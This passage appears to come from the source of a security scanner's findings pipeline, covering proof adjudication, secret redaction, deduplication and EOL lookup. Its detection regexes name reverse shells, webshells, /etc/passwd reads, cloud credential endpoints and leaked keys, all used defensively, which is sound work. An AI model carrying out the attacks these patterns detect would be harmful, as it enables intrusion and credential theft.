import crypto, { randomUUID } from 'node:crypto'
import net from 'node:net'
import { payloadsRag } from './integrations/index.js'
import { runNativeTool, cancelNativeTools, previewNativeCommand, nativeToolsStatus, NATIVE_TOOLS } from './integrations/native-tools.js'
import { buildCoverage, coverageFromMeta } from './integrations/coverage.js'
import { aiEngine } from './ai/ai-engine.js'
import { enrichWithOwasp } from './owasp.js'
import { getScriptsForTrigger, runCustomScript } from './custom-scripts.js'
import { findVersionVulnerabilities } from './cve.js'
import { matchExploits, classifyRisk, needsApproval } from './exploits/registry.js'
import {
  extractVersions,
  extractProductsWithoutVersion,
  correlateVersion,
  buildVersionFinding,
  buildUnversionedFinding,
  buildEdgeInventoryFinding,
  isEdgeProduct,
} from './version-audit.js'
import {
  calculateCvss4,
  defaultVectorForFinding,
  severityFromCvss4Score,
  evaluateFindingCvss,
  CVSS4_TEMPLATES,
} from './cvss4.js'
import { projectHost } from './exploits/probe-utils.js'
import * as db from './db.js'
import { findCaptures } from './report-contract.js'

/**
 * UnifiedPipeline — ONE orchestration flow for both blackbox and whitebox.
 *
 * SentinelAI had two disconnected paths; here every finding (whether from a
 * native tool or a static code audit) flows through the SAME stages:
 *   collect → OWASP enrich → RAG PoC cross-reference → AI verify → sanitize → persist
 *
 * Emits live events via the provided emitter (WebSocket broadcast).
 */

/**
 * Score floor per severity band, used ONLY for ordering/ranking internals that
 * never render a number. Any value that reaches a report must come from
 * `evaluateFindingCvss()` — see the design contract in cvss4.js.
 */
const SEVERITY_RANK = { info: 0, low: 1, medium: 2, high: 3, critical: 4 }

/**
 * Nuclei templates that only match a VERSION STRING against a known-bad range
 * ("Nginx End-of-Life - Detect", "Apache 2.4.49 - Detect"). They assert "this
 * software exists and is old", never "this is exploitable here". The template's
 * own `info.severity` is `info` for exactly that reason, so a generic lifecycle
 * override must not walk them up to `high` — an outdated banner is not a HIGH
 * finding on its own. Real EOL risk is still reported, by the lifecycle stage
 * that reads a curated EOL registry and can state months-of-exposure.
 */
const VERSION_ONLY_RE = /\b(end[\s-]?of[\s-]?life|eol|unsupported version|outdated version|version detect|is outdated|obsolete)\b/i

function extractHtmlTitle(body) {
  return String(body || '').match(/<title[^>]*>([\s\S]*?)<\/title>/i)?.[1]?.replace(/\s+/g, ' ').trim().slice(0, 200) || null
}

function splitSetCookieHeader(value) {
  return String(value || '').split(/,(?=\s*[^;,=\s]+=[^;,]*)/).map(v => v.trim()).filter(Boolean)
}

async function fetchWithHttpFallback(target, options = {}) {
  const raw = String(target || '').trim()
  const hasScheme = /^https?:\/\//i.test(raw)
  const urls = hasScheme
    ? [raw]
    : [`https://${raw}`, `http://${raw}`]
  let lastError
  for (const url of urls) {
    try {
      return { response: await fetch(url, options), url }
    } catch (err) {
      lastError = err
    }
  }
  throw lastError || new Error('request failed')
}

function isSelfSerializedFinding(value) {
  if (typeof value !== 'string') return false
  const text = value.trim()
  return /^\{[\s\S]*"(?:title|severity|description|cweId|owaspCategory)"\s*:/.test(text)
}

/**
 * Stage 4 — PII / Secret Sanitization.
 * Scrubs sensitive credential material from finding evidence and PoC fields
 * before they are persisted to the database and broadcast via WebSocket.
 * Preserves vulnerability descriptions, OWASP categories, CWE IDs, tool names,
 * and other legitimate finding content.
 */
const REDACTED = '***REDACTED***'

// Keys whose values are always fully redacted
const SENSITIVE_KEYS = /^(pass|password|passwd|secret|api_key|apikey|token|authorization|session_id|sessionid|cookie_value|access_token|refresh_token|private_key|client_secret)$/i

// Patterns redacted inside string values
const SENSITIVE_PATTERNS = [
  // JWT tokens
  { re: /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/g, rep: 'eyJ***REDACTED_JWT***' },
  // Bearer tokens
  { re: /Bearer\s+[A-Za-z0-9._~+/=-]{8,}/gi, rep: `Bearer ${REDACTED}` },
  // AWS access keys
  { re: /AKIA[0-9A-Z]{16}/g, rep: `AKIA${REDACTED}` },
  // Generic API keys (sk-..., pk-...)
  { re: /\b(sk|pk)[-_][A-Za-z0-9]{16,}\b/g, rep: `$1-${REDACTED}` },
  // Session cookie values (PHPSESSID=xxx, session=xxx, connect.sid=xxx)
  { re: /((?:PHPSESSID|session|connect\.sid|JSESSIONID|ASP\.NET_SessionId|ci_session)\s*=\s*)[^\s;,]{6,}/gi, rep: `$1${REDACTED}` },
]

// Partial-redact email: keep first 2 chars + @domain
function redactEmail(email) {
  return email.replace(/([a-zA-Z0-9._%+-]{2})[a-zA-Z0-9._%+-]*(@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g, '$1***$2')
}


function sanitizeValue(value) {
  if (typeof value !== 'string') return value
  let v = value
  for (const { re, rep } of SENSITIVE_PATTERNS) {
    v = v.replace(re, rep)
  }
  v = redactEmail(v)
  return v
}

function sanitizeObject(obj) {
  if (obj === null || obj === undefined) return obj
  if (typeof obj === 'string') return sanitizeValue(obj)
  if (Array.isArray(obj)) return obj.map(sanitizeObject)
  if (typeof obj !== 'object') return obj
  const out = {}
  for (const [k, v] of Object.entries(obj)) {
    if (SENSITIVE_KEYS.test(k) && typeof v === 'string') {
      out[k] = REDACTED
    } else {
      out[k] = sanitizeObject(v)
    }
  }
  return out
}

function sanitizeFinding(finding) {
  if (!finding) return finding
  const f = { ...finding }
  // Sanitize evidence object
  if (f.evidence && typeof f.evidence === 'object') {
    f.evidence = sanitizeObject(f.evidence)
  } else if (typeof f.evidence === 'string') {
    f.evidence = sanitizeValue(f.evidence)
  }
  // Sanitize PoC field (may contain raw payloads with embedded secrets)
  if (f.poc && typeof f.poc === 'object') {
    f.poc = sanitizeObject(f.poc)
  } else if (typeof f.poc === 'string') {
    f.poc = sanitizeValue(f.poc)
  }
  return f
}

function removeNonEvidenceEchoes(finding) {
  const evidence = finding?.evidence && typeof finding.evidence === 'object'
    ? { ...finding.evidence }
    : {}
  if (isSelfSerializedFinding(evidence.raw)) {
    delete evidence.raw
  }
  return { ...finding, evidence }
}

/**
 * Proof detector for "this is a real SQL injection" claims.
 *
 * The naive form of this check was the single worst bug in the misclassification
 * path: `/sql\s*(?:error|syntax)/` matched the phrase "no SQL error was observed"
 * — a DENIAL — and therefore reported that proof existed. Because the whole point
 * of the overrule is to catch findings whose evidence *admits* it has no artifact,
 * a negation-blind detector disables the overrule on exactly the findings it
 * exists to correct. Every indicator is now checked against a preceding
 * negation, and scanned line-by-line so a denial on one line cannot mask a
 * confirmation on the next.
 */
function hasSqlInjectionProof(text) {
  // Phrasings that only appear once an injection has actually been DEMONSTRATED.
  // Written to allow intervening words (`error-based SQL injection` must match
  // `error[- ]based ... injection`) — a detector that misses real proof is just
  // as harmful as one that invents it, because it downgrades a genuine finding.
  const indicators = [
    /sql\s*(?:error|syntax)/i,
    /database\s+error/i,
    /injectable\s+parameter/i,
    /parameter\s+is\s+injectable/i,
    /parameter\s+is\s+vulnerable/i,
    /vulnerable\s+to\s+(?:sql|blind\s+sql)/i,
    /sqlmap\s+(?:confirmed|identified)/i,
    /error[- ]based[^.\n]{0,40}injection/i,
    /(?:boolean|time|union)[- ]based[^.\n]{0,40}(?:injection|inference|proved|confirmed)/i,
    /sql\s+injection[^.\n]{0,30}(?:confirmed|verified|demonstrated|present|reproduced)/i,
    /confirmed[^.\n]{0,20}sql\s+injection/i,
  ]
  const negated = /(?:\bno\b|\bnot\b|\bnever\b|\bwithout\b|\babsence\s+of|\black(?:s|ing)?\b|\bmissing\b|\bunproven\b|\bunsupported\b|\bunconfirmed\b|\bfailed\s+to|\bcannot\b|\bcan't\b|\bunable\s+to|\bno\s+evidence\b)\W*(?:\w+\W+){0,3}$/i
  return String(text || '')
    .split(/\r?\n/)
    .some(line => indicators.some(re => {
      const hit = re.exec(line)
      return Boolean(hit) && !negated.test(line.slice(0, hit.index))
    }))
}

function responseEvidence(evidence = {}) {
  const body = evidence.body || evidence.responseBody || evidence.output || ''
  const contentLength = Number(evidence.contentLength ?? evidence.responseSize ?? evidence.size ?? (typeof body === 'string' ? body.length : NaN))
  const bodyHash = evidence.bodyHash || (typeof body === 'string' && body
    ? crypto.createHash('sha256').update(body.slice(0, 4096)).digest('hex')
    : null)
  return {
    status: Number(evidence.status ?? evidence.statusCode ?? NaN),
    contentLength: Number.isFinite(contentLength) ? contentLength : null,
    bodyHash,
    isHtml: Boolean(evidence.isHtml) || /^(?:text\/html|application\/xhtml\+xml)\b/i.test(String(evidence.contentType || '')) ||
      /<(!doctype|html|head|body)\b/i.test(String(body).trim()),
    claim: `${evidence.claim || ''} ${evidence.type || ''}`,
  }
}

/**
 * Claims that a `200 OK` alone cannot substantiate.
 *
 * Each entry maps a claim to the artifact that would actually prove it. The
 * `proof` fields are matched against evidence text (`content`, `body`,
 * `snippet`, `excerpt`, `raw`, `poc`) — NOT against the title, because the
 * title is the very thing being adjudicated. Matching the title let a finding
 * whose description was `"Found pattern: <?php"` re-qualify itself as proven
 * just by being titled "PHP injection".
 */
const CLAIM_PROOF_RULES = [
  {
    claim: 'code execution',
    match: /\b(?:webshell|web shell|backdoor|rce|remote code execution|command injection|arbitrary command|code execution|shell upload|reverse shell)\b/i,
    proof: [
      /uid=\d+\([^)]+\)\s+gid=\d+/i,          // id / whoami output
      /\b(?:root|www-data|nobody|apache|nginx):[\w$/]/i, // /etc/passwd-shaped line
      /^#!\/(?:usr\/bin|bin)\/(?:ba)?sh/m,     // a shebang in a returned script
      /<\?php[\s\S]{0,400}(?:eval|system|exec|shell_exec|passthru)\s*\(/i, // actual PHP source returned
      /\b(?:Microsoft Windows|Darwin Kernel|Linux \S+ \d+\.\d+)\b/,       // uname-shaped banner
      /\bcommand (?:executed|output)\b/i,
    ],
  },
  {
    claim: 'unauthorised data access',
    // A bare "accessible without auth" needs an actual record to be data access.
    // `/api/users/1` returning `{"error":"invalid token"}` or an empty array is
    // an authentication boundary holding, not an IDOR.
    match: /\b(?:idor|bola|broken object level|insecure direct object|access(?:ible|ed) without auth|without authentication|unauthenticated access|authorization bypass|auth bypass)\b/i,
    proof: [
      /\b[\w.+-]+@[\w-]+\.[\w.]{2,}\b/,                      // an email address
      /\b(?:19|20)\d{2}-\d{2}-\d{2}T?\d{0,2}/,               // a record timestamp
      /"(?:id|uuid|user_?id|account|email|username|token|balance|iban|ssn|phone)"\s*:\s*(?:"[^"]{1,}"|\d+)/i,
      /\b(?:access_token|api_key|session|authorization)\s*[:=]\s*\S/i,
      /\b(?:record|user|account|order|invoice|document|ticket)s?\s+(?:retrieved|returned|leaked|found)\b/i,
    ],
  },
  {
    claim: 'injection',
    match: /\b(?:sql injection|sqli|nosql injection|ssti|template injection|ldap injection|xml injection|xxe|expression language injection)\b/i,
    proof: [
      /SQL syntax.*MySQL|PostgreSQL.*ERROR|ORA-\d{5}|SQLite3?::|sqlite3\.OperationalError|Microsoft OLE DB|ODBC SQL Server|Unclosed quotation mark/i,
      /you have an error in your sql syntax/i,
      /Mongo(?:DB)?ServerError|MongoError|E11000 duplicate key/i,
      /\b(?:root|mysql|postgres|sa)\b.*(?:password|authentication)/i,
      /\d+\s+(?:rows?|records?)\s+(?:returned|fetched)/i,
      /\{\{[\s\S]{0,80}\}\}\s*(?:=|→|->)\s*\d+/,
    ],
  },
  {
    claim: 'secret exposure',
    // "exposed with secrets" is proven by a secret, not by the file existing.
    match: /\b(?:secret|credential|password|api[ _-]?key|private key|token)\b.{0,40}\b(?:expos|leak|disclos|found|present)\b|\b(?:expos|leak|disclos)\w*\b.{0,40}\b(?:secret|credential|password|api[ _-]?key)/i,
    proof: [
      /(?:password|passwd|pwd|secret|api[_-]?key|access[_-]?key|private[_-]?key|auth[_-]?token|connection[_-]?string)\s*[=:]\s*["']?[^\s"'<>]{6,}/i,
      /BEGIN (?:RSA |EC |OPENSSH |PGP )?PRIVATE KEY/,
      /\bAKIA[0-9A-Z]{12,}\b/,
      /\b(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{10,}\b/,
      /\bgh[pousr]_[A-Za-z0-9]{20,}\b/,
      /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/, // JWT
      /\b(?:mysql|postgres(?:ql)?|mongodb(?:\+srv)?|redis|amqp|mssql):\/\/[^\s"'<>]{6,}/i,
    ],
  },
  {
    claim: 'file disclosure',
    // Traversal / LFI is proven by the file's contents appearing.
    match: /\b(?:lfi|local file inclusion|path traversal|directory traversal|arbitrary file read|file disclosure|file inclusion)\b/i,
    proof: [
      /root:x?:0:0:/,                                        // /etc/passwd
      /\[(?:fonts|extensions)\]/i,                           // win.ini
      /(?:daemon|bin|sys):[x*]?:\d+:\d+:/,                   // more /etc/passwd lines
      /; for 16-bit app support/i,                           // boot.ini
      /\b(?:DB_PASSWORD|DB_USER|APP_KEY|SECRET_KEY)\s*=/,
      /<\?php\s+[\s\S]{0,200}\$(?:conn|link|db)/i,
    ],
  },
  {
    claim: 'server-side request forgery',
    match: /\b(?:ssrf|server-side request forgery)\b/i,
    proof: [
      /\b(?:ami-id|instance-id|instance-identity|iam\/security-credentials)\b/,
      /\b(?:localhost|127\.0\.0\.1|\[::1\])\b.{0,200}\b(?:open|refused|served|running)\b/i,
      /<title>\s*(?:Index of|Welcome to nginx|Apache2? (?:Ubuntu|Debian) Default Page)/i,
      /\bmeta-data\/\d\.\d\//,
    ],
  },
  {
    claim: 'unsafe deserialization',
    match: /\b(?:deserializ|pickle|ysoserial|object injection)\b/i,
    proof: [
      /java\.lang\.(?:Runtime|ProcessBuilder)|ysoserial|CommonsCollections/i,
      /rO0AB[A-Za-z0-9+/=]{20,}/,             // Java serialized stream
      /gAS[V\d][A-Za-z0-9+/=]{10,}/,           // Python pickle protocol
      /(?:CVE-\d{4}-\d+|deserialization (?:confirmed|triggered))/i,
    ],
  },
  {
    claim: 'authentication bypass',
    match: /\b(?:auth(?:entication)? bypass|login bypass|jwt (?:bypass|none|crack|forged)|session (?:fixation|hijack|forgery)|privilege escalation)\b/i,
    proof: [
      /\b(?:Set-Cookie|set-cookie)\s*:\s*\S+/,
      /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/,
      /"(?:token|access_token|jwt|session)"\s*:\s*"[^"]{12,}"/i,
      /\b(?:admin|administrator|superuser)\b.{0,60}\b(?:granted|authenticated|logged in|access granted)\b/i,
      /\brole"\s*:\s*"(?:admin|root|superuser)"/i,
    ],
  },
]

/** Artifact-bearing evidence fields, in the order they are trusted. */
const CLAIM_ARTIFACT_FIELDS = ['content', 'body', 'snippet', 'excerpt', 'responseBody', 'output', 'raw', 'poc', 'proof']

/**
 * Concatenate the target-produced bytes attached to a finding.
 *
 * `poc` is included only when it is a string: a structured PoC object is a
 * recipe the scanner wrote, not something the target emitted, and feeding it to
 * the proof rules would let `{"sqlmap": "--os-shell"}` self-certify as an
 * injection artifact.
 */
function claimArtifactText(v = {}) {
  const ev = (() => {
    let e = v.evidence
    if (typeof e === 'string') { try { e = JSON.parse(e) } catch { e = {} } }
    return e && typeof e === 'object' ? e : {}
  })()
  const parts = []
  for (const key of CLAIM_ARTIFACT_FIELDS) {
    const val = ev[key]
    if (typeof val === 'string') parts.push(val)
    else if (val && typeof val === 'object' && !Array.isArray(val)) {
      try { parts.push(JSON.stringify(val)) } catch { /* circular — skip */ }
    }
  }
  // `evidence.poc` is covered above; a bare top-level `poc` is always the
  // scanner's reconstruction (a command, a payload, a script), never bytes the
  // target produced, so it is deliberately excluded.
  return parts.join('\n').slice(0, 20000)
}

/**
 * Decide whether a finding's claimed severity is substantiated by a captured artifact.
 *
 * @param {{title?: string, severity?: string, description?: string, evidence?: object, proofArtifact?: boolean}} finding
 * @returns {{claim: string, severity: 'medium'} | null} the demotion to apply, or null to leave the finding alone
 */
export function adjudicateClaimSeverity({ title = '', severity = '', description = '', evidence = {}, proofArtifact = false } = {}) {
  const rank = SEVERITY_RANK[String(severity).toLowerCase()]
  if (rank == null || rank < SEVERITY_RANK.high) return null
  // AI-authored and source-level findings carry their own proof (the source
  // line, the model's reasoning). Only *response-driven* claims — the scanner
  // asserting that a remote host executed code, returned a record, or leaked a
  // file — are adjudicated here.
  const module = String(evidence.module || '').toLowerCase()
  if (/^code-audit|^sast|^dast-src|^source-/.test(module)) return null
  const claimText = `${title}\n${description}`
  // Negation is handled downstream: every rule returns a demotion when the
  // artifact is absent, and a self-negating description only ever *reinforces*
  // that outcome. Reading the keyword as the claim is what made the previous
  // guards turn "no traversal payload was captured" into a traversal finding.
  const artifactText = claimArtifactText({ evidence })

  for (const rule of CLAIM_PROOF_RULES) {
    if (!rule.match.test(claimText)) continue
    if (proofArtifact) return null
    // An in-band artifact that can only exist when the exploit worked is proof
    // even without a structured capture entry.
    if (artifactText && rule.proof.some(re => re.test(artifactText))) return null
    return { claim: rule.claim, severity: 'medium' }
  }
  return null
}

/**
 * Stages that describe the same underlying fact ("this product/version is
 * what's running here"). They share ONE fingerprint so the CVE correlation
 * produced by the version audit merges into the EOL record instead of being
 * deduplicated away as a "different" finding. Before this, the audit finding
 * was collapsed by the title-keyed fingerprint and the report printed
 * "nginx 1.18 … 0 matched" while NVD actually held applicable CVEs.
 */
const VERSION_FINDING_MODULES = new Set(['version-lifecycle', 'version-audit'])

/**
 * Resolve an EOL date for a detected `<major>.<minor>` branch.
 *
 * Hardcoded per-branch maps always go stale, and the previous implementation
 * read `entry.eol[branch]` directly: a missing key yielded `undefined`,
 * `new Date('undefined-01')` silently parsed as 2001-01-01T00:00:00Z (Node
 * returns a VALID Date for this), and the report claimed an EOL date of
 * "undefined" with "314 months" of exposure.
 *
 * Returns { status: 'supported' } for a null registry value,
 * { status: 'unknown' } when nothing can be asserted, or
 * { status: 'eol', eolDate, derived, oldestBranch }.
 */
function resolveEolDate(eolMap, branch) {
  if (Object.prototype.hasOwnProperty.call(eolMap, branch)) {
    const mapped = eolMap[branch]
    if (mapped === null) return { status: 'supported' }
    return { status: 'eol', eolDate: mapped, derived: false, oldestBranch: null }
  }
  // An untracked branch is still decidable when it is numerically OLDER than
  // every tracked one: it must have reached EOL no later than the oldest
  // tracked branch did. That is a conservative (never optimistic) answer.
  const tracked = Object.keys(eolMap).filter(k => eolMap[k] !== null)
  if (!tracked.length) return { status: 'unknown' }
  let oldest = null
  for (const key of tracked) {
    if (!/^\d+(\.\d+)*$/.test(key) || !/^\d+(\.\d+)*$/.test(branch)) continue
    if (compareDottedVersions(key, branch) > 0 && (!oldest || compareDottedVersions(key, oldest) < 0)) oldest = key
  }
  if (!oldest) return { status: 'unknown' }
  return { status: 'eol', eolDate: eolMap[oldest], derived: true, oldestBranch: oldest }
}

function compareDottedVersions(a, b) {
  const pa = String(a).split('.').map(n => parseInt(n, 10) || 0)
  const pb = String(b).split('.').map(n => parseInt(n, 10) || 0)
  const len = Math.max(pa.length, pb.length)
  for (let i = 0; i < len; i++) {
    const d = (pa[i] || 0) - (pb[i] || 0)
    if (d !== 0) return d
  }
  return 0
}


function evidenceTier(finding, targetType) {
  const code = String(finding.evidence?.code || '')
  if (targetType !== 'code') return finding.evidence?.poc ? 'exploited' : 'observed'
  if (/JwtModule\.register|secret\s*:/i.test(code)) return 'validated'
  if (/process\.env\.[A-Z0-9_]+\s*\|\||token|api.?key|secret/i.test(code)) return 'observed'
  if (/query\s*\(|queryRunner\.query|\.query\(/i.test(code) && /\$\{|\+/.test(code)) return 'needs-validation'
  return 'observed'
}

/**
 * Union two evidence payloads from the same logical finding.
 *
 * The old merge wrote `{ ...storedEvidence, sources }` — discarding everything the
 * incoming record had learned. That silently dropped the whole NVD correlation
 * (`knownCves`, `criticalCount`, `totalCves`) whenever the version-audit record
 * merged into the version-lifecycle record, which is why the report card printed
 * "0 matched" for a component with six applicable CVEs.
 *
 * Contract: incoming values win where they are informative, stored values are
 * kept where the incoming side says nothing (null/undefined/empty array).
 */
const NON_INFORMATIVE = new Set([null, undefined, '', 'unknown', 'n/a'])
export function mergeFindingEvidence(stored = {}, incoming = {}) {
  const out = { ...stored }
  for (const [key, value] of Object.entries(incoming || {})) {
    if (key === 'sources') continue
    const informative = Array.isArray(value)
      ? value.length > 0
      : typeof value === 'object' && value !== null
        ? Object.keys(value).length > 0
        : !NON_INFORMATIVE.has(value)
    // A concrete finding count is always better than "not looked up".
    if (key === 'totalCves' && out[key] != null && out[key] !== 0 && (value == null || value === 0)) continue
    if (informative || !(key in out)) out[key] = value
  }
  return out
}

function findingFingerprint(finding) {
  const evidence = finding.evidence || {}
  const file = String(evidence.file || '').replace(/\\/g, '/').toLowerCase()
  const line = evidence.line || ''
  const cwe = String(finding.cweId || finding.cwe || '').toLowerCase()
  // Include host so the same finding on different hosts isn't deduplicated away
  const host = (() => {
    // Prefer the concrete probe URL over the scan's root target: every blackbox
    // finding on a scan carries the same `target`, so keying on it first would
    // collapse them all onto one host bucket.
    const raw = String(evidence.url || finding.target || '')
    try { return new URL(ensureScheme(raw)).hostname.toLowerCase() } catch { return raw.toLowerCase() }
  })()
  // Product/version records are keyed on the PRODUCT, not the wording of the
  // title, so the EOL stage and the CVE-audit stage collapse into one record
  // that carries both halves of the truth.
  if (VERSION_FINDING_MODULES.has(finding.module) && evidence.product) {
    return `version|${String(evidence.product).toLowerCase()}|${host}`
  }
  // Extract route/path intelligently so tools lacking evidence.url still bind to their target path
  const route = (() => {
    let raw = String(evidence.url || '')
    if (!raw) {
      const searchTarget = `${finding.title || ''} ${evidence.body || ''} ${evidence.snippet || ''} ${finding.description || ''}`
      const m = searchTarget.match(/(https?:\/\/[^\s"',]+|(?:\s|^)(\/[a-zA-Z0-9_.\-\/]+))/i)
      if (m) raw = (m[1] || m[2]).trim()
    }
    if (!raw) raw = String(finding.target || '')
    try {
      let p
      if (raw.startsWith('/')) {
        p = raw.split(/[?#]/)[0].toLowerCase()
      } else {
        p = new URL(ensureScheme(raw)).pathname.toLowerCase()
      }
      p = p.replace(/[:.]+$/, '')
      return p.length > 1 ? p.replace(/\/+$/, '') : p
    } catch {
      return ''
    }
  })()

  // Canonicalize category across toolchains so multiple scanners discovering the same flaw
  // (e.g. nikto, katana, nuclei, path-enum on /actuator/env) merge into one unified finding.
  const titleText = String(finding.title || '').toLowerCase()
  const category = (() => {
    if (/actuator/i.test(titleText) || /\/actuator/i.test(route)) return 'actuator'
    if (/\.env/i.test(titleText) || /\.env/i.test(route) || /environment (?:credentials|variable)/i.test(titleText)) return 'dotenv'
    if (/backup|\.sql\b|\.dump\b|\.bak\b|database dump/i.test(titleText) || /\.sql|\.bak|\.dump|\.zip|\.tar/i.test(route)) return 'backup-file'
    if (/sql injection|raw query|query interpolation|\bsqli?\b/i.test(titleText)) return 'sql-injection'
    if (/command injection|\brce\b|remote code execution|shell execution/i.test(titleText)) return 'command-injection'
    if (/cross-site scripting|\bxss\b/i.test(titleText)) return 'xss'
    if (/path traversal|directory traversal|\blfi\b|local file inclusion/i.test(titleText)) return 'path-traversal'
    if (/ssrf|server-side request forgery/i.test(titleText)) return 'ssrf'
    if (/jwt|token|api.?key|secret|credential/i.test(titleText)) return 'credential'
    if (/cors/i.test(titleText)) return 'cors'
    if (/missing.*security.*header/i.test(titleText)) return 'security-headers'
    if (/server.*header|server banner/i.test(titleText)) return 'server-banner'
    if (/file upload|upload endpoint/i.test(titleText) || /\/upload/i.test(route)) return 'file-upload'
    return titleText
      .replace(/^(?:nikto|nuclei|nmap|httpx|katana|dalfox|ffuf|subfinder|sqlmap|wpscan|arjun|native:[\w-]+|custom:[\w-]+)\s*:\s*/i, '')
      .replace(/^\[(?:\d+|[+*!~]|info|low|medium|high|critical)\]\s*/gi, '')
      .replace(/^\+\s*/, '')
      .trim()
  })()

  // Blackbox findings carry no file/line, so cwe+category+host alone collapsed
  // two genuinely different issues on the SAME host (e.g. /search?id=1 and /login
  // both → cwe-89|sql-injection|host) and the second was dropped as a duplicate.
  // Adding the path keeps the record distinct without weakening the EOL/CVE
  // collapse above, which is keyed on product and never reaches this branch.
  if (!file && !line) {
    return `${cwe}|||${category}|${host}|${route}`
  }
  return `${cwe}|${file}|${line}|${category}|${host}`
}

export function getRootDomain(hostname) {
  if (!hostname) return ''
  const clean = hostname.replace(/^https?:\/\//i, '').split('/')[0].split(':')[0].toLowerCase().trim()
  if (!clean) return ''
  // IP literals and localhost are already roots — never slice them into a fake
  // registrable domain such as "0.1" or "1" (which yields nonsense playbook labels).
  if (clean === 'localhost' || net.isIP(clean)) return clean
  const parts = clean.split('.').filter(Boolean)
  if (parts.length <= 2) return parts.join('.')

  const secondLevelTlds = new Set([
    'edu.my', 'com.my', 'net.my', 'org.my', 'gov.my', 'mil.my', 'sch.my',
    'co.uk', 'org.uk', 'me.uk', 'ltd.uk', 'plc.uk', 'net.uk', 'sch.uk', 'ac.uk', 'gov.uk',
    'com.au', 'net.au', 'org.au', 'edu.au', 'gov.au',
    'co.nz', 'net.nz', 'org.nz', 'govt.nz', 'ac.nz',
    'co.id', 'web.id', 'ac.id', 'go.id', 'my.id', 'sch.id',
    'co.jp', 'ne.jp', 'or.jp', 'go.jp', 'ac.jp',
    'com.sg', 'edu.sg', 'gov.sg', 'net.sg', 'org.sg',
    'com.hk', 'edu.hk', 'gov.hk', 'net.hk', 'org.hk',
    'co.za', 'gov.za', 'ac.za', 'edu.za',
    'com.br', 'gov.br', 'edu.br', 'org.br',
    'co.in', 'net.in', 'org.in', 'gen.in', 'firm.in', 'ind.in',
    'edu.cn', 'gov.cn', 'com.cn', 'net.cn', 'org.cn',
  ])

  const lastTwo = parts.slice(-2).join('.')
  if (secondLevelTlds.has(lastTwo)) {
    return parts.slice(-3).join('.')
  }
  return parts.slice(-2).join('.')
}

/**
 * Ensure a URL string carries an explicit scheme.
 * Blackbox targets may be typed as a bare host ("example.com"). Every downstream
 * consumer (new URL, the /^https?:\/\// gate in _collectUrls, fetch) needs a
 * scheme, so discovery-derived URLs built by string concatenation silently
 * vanished when the operator omitted it.
 */
export function ensureScheme(url) {
  const s = String(url || '').trim()
  if (!s) return s
  if (/^https?:\/\//i.test(s)) return s
  if (/^[a-z][a-z0-9+.-]*:/i.test(s)) return s // ftp:, mailto:, … leave alone
  return `https://${s.replace(/^\/+/, '')}`
}

export function joinUrl(base, p) {
  try {
    const raw = ensureScheme(base)
    const url = new URL(raw)
    const cleanPath = (p || '').replace(/^\/+/, '')
    return new URL(p && p.startsWith('/') ? p : `${url.pathname.replace(/\/+$/, '')}/${cleanPath}`, url.origin).href
  } catch {
    const b = ensureScheme(base).replace(/\/+$/, '')
    const cleanPath = (p || '').replace(/^\/+/, '')
    return `${b}/${cleanPath}`
  }
}

export class UnifiedPipeline {
  constructor({ io } = {}) {
    this.io = io
    // scanId -> { paused: bool, pauseWaiters: [] } — runtime control flags
    this.control = new Map()
    // scanId -> blackbox metadata (tools/urls/subdomains) used by retry logic
    this._blackboxMeta = new Map()
    // scanIds whose terminal notification (WS 'scan:done', PDF email, Telegram/
    // Discord alert) must be suppressed because another stage of the same scan
    // is still queued — e.g. hybrid runs whitebox then blackbox on one scanId.
    // Without this, finish() after whitebox fired 'completed' at 100%, the bar
    // reset to 2% for blackbox, and every notification/email was sent twice
    // (the first one carrying no blackbox findings).
    // Scan depth selected by the caller ('quick' | 'standard' | 'deep').
    // Custom scripts read this; without the assignment every scan silently
    // ran at 'standard' regardless of what was requested.
    this.depth = 'standard'
    // scanId -> depth requested by the caller, so depth survives until the
    // stage that reads it (custom scripts run after finish() clears this.depth).
    this._scanDepth = new Map()
    // scanId -> Set of discovered URLs queued for injection chaining
    this._urlPool = new Map()
    // scanId -> Array of harvested login forms {url, userField, passField, extra}
    this._loginForms = new Map()
    // scanId -> scan-coverage descriptor derived from the tools present on
    // this host. A scan whose critical classes have no tool available is
    // INCOMPLETE, and the report has to say so rather than print a headline
    // posture over untested ground. See integrations/coverage.js.
    this._coverage = new Map()
    // Recently finished scanIds. Without this, a pause/stop call arriving after
    // a scan completed would lazily re-create a `control` entry that nothing
    // ever deletes — one leaked entry per post-finish API call. Bounded below.
    this._finishedScans = new Set()
    // scanIds whose finish() must not emit terminal notifications yet — see
    // deferFinish()/releaseDeferredFinish().
    this._deferredFinish = new Set()
    // scanId -> LLM verification budget. A bulk scanner (nuclei, ffuf, gobuster)
    // can emit hundreds of findings that each legitimately "own" the same domain
    // (cors/auth/injection word in the template name). Without a budget the scan
    // fans out one model call per finding, which is slow and expensive. Once the
    // budget is spent the finding still gets an artifact-backed attribution —
    // only the paid tier is skipped, so nothing is dropped and nothing is faked.
    this._llmBudget = new Map()
    // scanId -> randomized response baseline used to suppress catch-all pages
    this._catchAllBaselines = new Map()
  }

  /** Max paid verifications per scan (override with SENTINEL_LLM_BUDGET). */
  static LLM_BUDGET_DEFAULT = Number(process.env.SENTINEL_LLM_BUDGET || 60)

  /**
   * Reserve a paid verification slot. Returns false when the scan's budget is
   * exhausted, so the caller falls back to deterministic attribution.
   */
  _takeLlmSlot(scanId) {
    if (this._finishedScans.has(scanId)) return false
    const max = UnifiedPipeline.LLM_BUDGET_DEFAULT
    const used = this._llmBudget.get(scanId) || 0
    if (used >= max) return false
    this._llmBudget.set(scanId, used + 1)
    return true
  }

  /** Cap for the finished-scan tombstone set so it can never grow unbounded. */
  static FINISHED_TOMBSTONE_MAX = 512

  _markFinished(scanId) {
    this._finishedScans.add(scanId)
    if (this._finishedScans.size > UnifiedPipeline.FINISHED_TOMBSTONE_MAX) {
      // Set preserves insertion order — drop the oldest tombstone.
      this._finishedScans.delete(this._finishedScans.values().next().value)
    }
  }

  /**
   * Keep terminal notification side effects deferred for a scanId.
   *
   * Used by hybrid/whitebox-folder runs, which execute whitebox and blackbox
   * sequentially on a single scanId. Call before the first stage so its
